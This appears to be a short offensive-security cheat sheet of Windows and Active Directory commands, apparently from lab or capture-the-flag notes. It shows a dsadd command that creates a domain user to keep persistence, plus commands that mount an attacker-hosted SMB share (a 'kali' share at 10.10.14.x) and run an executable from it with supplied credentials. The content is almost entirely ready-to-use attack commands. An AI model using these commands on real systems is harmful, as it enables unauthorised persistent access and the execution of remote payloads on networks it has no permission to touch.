# General Commands

# Create a user

You have the option to create an active directory user to maintain persistence.

```jsx
dsadd user “cn=Russell Smith,cn=Users,dc=ad,dc=contoso,dc=com” -samid russellsmith -upn russellsmith@ad.contoso.com -fn Russell -ln Smith -display “Russell Smith” -disabled no -pwd “PassW0rd!” -mustchpwd yes
```

# Authenticating for smbserver.py

```bash
$pass = ConvertTo-SecureString 'test' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("virusspec", $pass)

CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali" #optionally append "-Credential $cred" with a PS-Credential
WindPS-2> cd new_disk:
```

You can also do 

```bash
net use \\server /user:domain\username password
New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
```